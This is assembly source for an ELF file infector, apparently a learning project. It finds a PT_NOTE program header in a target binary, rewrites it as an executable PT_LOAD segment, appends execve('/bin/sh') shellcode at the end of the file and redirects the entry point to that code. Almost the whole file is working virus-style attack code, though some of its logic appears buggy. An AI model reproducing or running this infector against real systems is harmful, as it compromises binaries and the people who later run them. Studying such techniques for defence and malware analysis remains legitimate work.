section .data
	buf times 4 db 0            ; Buffer for the 4 first bytes
	ELF_numbers db 0x7F, 0x45, 0x4C , 0x46  
	is_ELF_msg db "The file is an ELF file.", 0xA, 0   ;0xA is for line break
	not_ELF_msg db "error, the file printed is not an ELF file.", 0xA, 0
	error_msg db "The programm returned an error", 0xA, 0
	error_msg_args db "error, only one argument is needed. Syntax : ./infector file", 0xA, 0
	error_msg_file db "error, the file printed is a folder. Please enter an ELF file.", 0xA, 0
	success_msg db "Bravo, the file is well infected", 0xA, 0
	debug_msg_pt_note_found db "pt_note trouvé", 0xA, 0
	debug_msg_header_modified db "en tete modifié",0xA, 0
	debug_msg_writing_payload db "program header overwrite done",0xA, 0
	debug_parsing_elfheader db "elf header parsé",0xA, 0
	debug_parse_loop db "loop de parsing program header",0xA, 0
	payload db 0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05
	payload_len equ $ - payload  ;payload length

	
section .bss 
	stat_buff resb 144 ;reserve bytes(saving space) (144bytes) for the fstat command later
	ELF_header_buff resb 64 ;save space to read and parse the ELF header
	program_header_buff resb 56 ;idem for the program header 
	
    phoff resq 1       ; reserve quadword = 4 times a word size = 8 bytes / save space to store the memory address for the beginning of the program headers
	current_phoff resq 1   ; to loop on all the programm headers

    phnum resw 1       ; reserve word = 2 times a word size = 2 bytes
	filename resb 256
	fd resd 1       ; to save the file descriptor later 
	
	
section .text
    global _start

_start:
	mov rdi, [rsp]          ; get argc
	cmp rdi, 2              ; argc must be equal to 2 (name of the program + first argument) 
	jne wrong_args 
	mov rsi, [rsp +16]    ; getting the first argument 
	mov rdi, filename    ; filename buffer in rdi 
	call copy_string 
	call main
	call exit_program


wrong_args:
    mov rsi, error_msg_args  
    mov rdx, 61
    call print_message
    mov rax, 60
    mov rdi, 1
    syscall


main: 
    call stat_file	
    call check_if_regular_file
    call check_elf
	call parse_elfheader
	call parse_programm_header
    call close_file
    ret



stat_file:
    mov rax, 4      ; sys_stat
    mov rdi, filename
    mov rsi, stat_buff
    syscall
    test rax, rax
    js error
    ret


	
check_if_regular_file:
    mov rax, [stat_buff + 24]  ; load st_mode (16 bytes in the stat structure)
    and rax, 0xF000            ; mask to isolate the mask type bites (the "file type" bytes are located in the first 4 bytes) 
    cmp rax, 0x8000            ; 0x8000 = S_IFREG (regular file)
    je is_regular_file
    
    mov rsi, error_msg_file
    mov rdx, 63
    call print_message
    jmp exit_program

is_regular_file:
	ret


check_elf:
	; Open the file
	mov rax, 2      ; sys_open
	mov rdi, filename
	mov rsi, 2      ; read-write
	syscall
	test rax, rax
	js error
	mov [fd], rax    ; Save file descriptor


	; read the first 4 bytes in the file 
	mov rdi, [fd]
	mov rax, 0                   ; sys_read 
	mov rsi, buf                 
	mov rdx, 4                   ; 4 octets read	
	syscall
	test rax, rax
	js error
	
	mov rcx, 4                   ; for the loop 
	xor rdi, rdi     
	
	call compare_loop
	
	mov rsi, is_ELF_msg
	mov rdx, 25   
	call print_message  
	ret
	

compare_loop: 
	;verify file magic bytes
	mov al, [buf + rdi]
	cmp al, [ELF_numbers + rdi]
	jne not_ELF
	inc rdi
	dec rcx
    jnz compare_loop
	ret

not_ELF:
	;Print that the file is not an ELF
	mov rsi, not_ELF_msg
	mov rdx, 44
	call print_message
	jmp exit_program 




close_file:		
	mov rdi, [fd]  
	mov rax, 3      ;sys_close 
	syscall        
	ret



copy_string:
    mov al, [rsi]       
    mov [rdi], al      
    test al, al        ; check if the caracter is null
    je copy_done       
    inc rsi             
    inc rdi           
    jmp copy_string     

copy_done:
    ret  
    
    


;_______________________Parsing structures 

parse_elfheader:

    ; set ourselves at the beginning of the file (we read the 4 magic bytes before)
    mov rax, 8          
    mov rdi, [fd]       
    mov rsi, 0          ; offset 0
    mov rdx, 0        
    syscall
    test rax, rax
    js error

	mov rax, 0
	mov rdi, [fd]
	mov rsi, ELF_header_buff
	mov rdx, 64 ;number of bytes to read
	syscall
	test rax, rax
	js error

	mov rax, [ELF_header_buff + 0x20]   ;read 8 bytes 
	mov [phoff], rax

	movzx rax, word[ELF_header_buff + 0x38]   ; movzx : fills the superior bytes of the rax with 0 to ensure its the good value
	mov [phnum], rax

	mov rsi, debug_parsing_elfheader
	mov rdx, 18
	call print_message

	ret




parse_programm_header:

  	mov rcx, [phnum]              ; number of program headers
    mov rax, [phoff]              ; offset to programm headers
    mov [current_phoff], rax

	jmp parse_loop

parse_loop:

	push rcx

	mov rsi, debug_parse_loop
	mov rdx, 32
	call print_message

	pop rcx

	test rcx, rcx
	jz end_parse


	mov rax, 8              ; lseek : to place ourselves at the good offset
	mov rdi, [fd]
	mov rsi, [current_phoff]
	mov rdx, 0
	syscall 
	test rax, rax
	js error

	mov rax, 0
	mov rdi, [fd]
	mov rsi, program_header_buff
	mov rdx, 56	
	syscall
	test rax, rax
	js error

	mov eax, [program_header_buff]     ; grabbing the 4 first bytes 
	cmp eax, 4                        ; check if PT_NOTE
	je pt_note_found


    add qword [current_phoff], 56   
	dec rcx,
	jmp parse_loop

	

pt_note_found:


	mov rsi, debug_msg_pt_note_found
	mov rdx, 16
	call print_message

	mov dword [program_header_buff], 1     ;modify program header type from PT_NOTE to PT_LOAD (in p_type)

    mov dword [program_header_buff + 4], 7  ; add permissions to execute and read (rwx) / permissions are located in the offset + 4 of the programm header (in p_flags)

    ; get the file size to write the payload at the end 
    mov rax, 8     
    mov rdi, [fd]
    mov rsi, 0      ; offset
    mov rdx, 2      ; SEEK_END
    syscall
    test rax, rax
    js error

	;save file size
	mov r12, rax
	add r12, 0xFFF  ; add 0xFFF (4095) to round up to the nearest multiple of 0x1000	
	and r12, 0xFFFFFFFFFFFFF000  ; Mask the 12 least significant bits to obtain a multiple of 0x1000

	; update p_offset to point the end of the file 
    mov [program_header_buff + 8], r12

    ; update p_vaddr et p_paddr to specify where the segment will be loaded in the memory 
    mov [program_header_buff + 16], r12 
	mov [ELF_header_buff + 24], r12 ; 

	; calculate segment size
	mov r13, payload_len
	add r13, 0xFFF  ; round up to the superior multiple of 0x1000
	and r13, 0xFFFFFFFFFFFFF000



	; update p_filesz and p_memsz according to our payload size 
	mov [program_header_buff + 32], r13  ; p_filesz
	mov [program_header_buff + 40], r13  ; p_memsz

	; update e_entry in the ELF header
	mov rax, [ELF_header_buff + 24]  ; save the old entry point
	mov [ELF_header_buff + 24], r12  ; new entry point (beginning of the segment)



	; modify the payload to save and get back to the original point
	mov qword [payload], 0x68 ; push instruction
	mov qword [payload + 1], rax ; address of the original entry point 
	mov byte [payload + 9], 0xc3 ; ret instruction

	mov rsi, debug_msg_header_modified
	mov rdx, 17
	call print_message


	; we place oursevles at the adresse we calculated
    mov rax, 8     
    mov rdi, [fd]   
    mov rsi, r12    
    mov rdx, 0      
    syscall
    test rax, rax
    js error

	mov rsi, debug_msg_header_modified
	mov rdx, 17
	call print_message



	;we write our payload
    mov rax, 1      
    mov rdi, [fd]   
    mov rsi, payload
    mov rdx, payload_len
    syscall
    test rax, rax
    js error

	mov rsi, debug_msg_header_modified
	mov rdx, 17
	call print_message



    ; we place ourselves at the beginning of the PT_NOTE
    mov rax, 8      
    mov rdi, [fd]
    mov rsi, [phoff]
    mov rdx, 0      
    syscall
    test rax, rax
    js error


	mov rsi, debug_msg_header_modified
	mov rdx, 17
	call print_message



	;We overwrite the program header, and make it become a PT_LOAD
    mov rax, 1      
    mov rdi, [fd]
    mov rsi, program_header_buff
    mov rdx, 56     
    syscall
    test rax, rax
    js error

	mov rsi, debug_msg_header_modified
	mov rdx, 17
	call print_message




	mov rsi, debug_msg_writing_payload
	mov rdx, 31
	call print_message



; updating the main header (e_shoff)
    mov rax, 8          
    mov rdi, [fd]        
    mov rsi, 0          ; offset 0 
    mov rdx, 0          
    syscall
    test rax, rax
    js error

    mov rax, 0          ; sys_read
    mov rdi, [fd]      
    mov rsi, ELF_header_buff
    mov rdx, 52         
    syscall
    test rax, rax
    js error

    ; update shoff only if necessary 
    mov rax, [ELF_header_buff + 40]  ; e_shoff
    cmp rax, r12        ; compare with the file size before injection 
    jbe skip_update    ; if shoff <= file size, no update needed

    add rax, payload_len
    mov [ELF_header_buff + 40], rax  ; update shoff

    ; overwrite header
    mov rax, 8          
    mov rdi, [fd]       
    mov rsi, 0          
    mov rdx, 0          ;lseek at the beginning
    syscall
    test rax, rax
    js error

    mov rax, 1        
    mov rdi, [fd]        
    mov rsi, ELF_header_buff
    mov rdx, 52         
    syscall
    test rax, rax
    js error

	jmp skip_update



;__________________________________________________________________________

skip_update:



	mov rsi, success_msg
	mov rdx, 32
	call print_message

	xor rcx, rcx
    jmp parse_loop


end_parse:
	ret 


    
print_message:
    mov rax, 0x1               
    mov rdi, 1                 
    syscall
    ret

exit_program:
	mov rax, 60                  
	xor rdi, rdi                
	syscall


error:
	; Handle errors (Print & exit) 
	mov rax, 0x1
	mov rdi, 1 
	mov rsi, error_msg
	mov rdx, 31
	syscall
	mov rax, 60                 
	mov rdi, 1                    ; Exit code 1
	syscall
